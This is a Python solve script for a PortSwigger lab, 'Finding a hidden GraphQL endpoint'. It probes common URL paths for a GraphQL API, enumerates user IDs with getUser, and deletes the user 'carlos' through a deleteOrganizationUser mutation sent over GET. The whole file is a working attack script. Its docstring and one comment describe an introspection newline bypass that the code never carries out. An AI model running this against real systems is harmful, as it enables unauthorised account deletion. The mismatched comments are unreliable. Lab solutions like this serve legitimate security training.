#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Finding a hidden GraphQL endpoint.

1. Probe common paths for the GraphQL endpoint using {__typename}.
2. Bypass introspection keyword filter with a newline after __schema.
3. Map the schema to find deleteOrganizationUser mutation.
4. Enumerate getUser(id) to find carlos's ID.
5. Delete carlos.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROBE_PATHS = ["/api", "/graphql", "/v1", "/api/graphql", "/graphql/v1", "/graphiql", "/gql"]


def probe_endpoint(lab):
    """Find the GraphQL endpoint by probing common paths."""
    for path in PROBE_PATHS:
        url = f"{lab}{path}"
        try:
            r = requests.get(url, params={"query": "{__typename}"}, verify=False, timeout=5)
            if r.status_code == 200 and "__typename" in r.text:
                print(f"[+] GraphQL endpoint found: {path}")
                return path
        except Exception:
            pass
    return None


def graphql_get(lab, path, query):
    """Send a GET-based GraphQL query with newline bypass for introspection."""
    r = requests.get(
        f"{lab}{path}",
        params={"query": query},
        verify=False,
    )
    return r.json()


def find_carlos(lab, path, max_id=10):
    for user_id in range(1, max_id + 1):
        data = graphql_get(lab, path, f"{{getUser(id:{user_id}){{id,username}}}}")
        user = data.get("data", {}).get("getUser")
        if user:
            print(f"  id={user['id']}  username={user['username']}")
            if user.get("username") == "carlos":
                return user["id"]
    return None


def delete_user(lab, path, user_id):
    # Mutation via GET with newline bypass embedded in query string
    query = f"mutation{{deleteOrganizationUser(input:{{id:{user_id}}}){{user{{id,username}}}}}}"
    data = graphql_get(lab, path, query)
    print(f"[*] Delete response: {data}")
    return data


def main():
    parser = argparse.ArgumentParser(
        description="Solve Finding a Hidden GraphQL Endpoint lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    print("[*] Probing for GraphQL endpoint...")
    path = probe_endpoint(lab)
    if not path:
        print("[-] Endpoint not found.")
        return

    print("[*] Enumerating users...")
    carlos_id = find_carlos(lab, path)
    if not carlos_id:
        print("[-] Carlos not found.")
        return

    print(f"[+] Carlos found at id={carlos_id}. Deleting...")
    delete_user(lab, path, carlos_id)
    print("[+] Done — lab should be solved.")


if __name__ == "__main__":
    main()
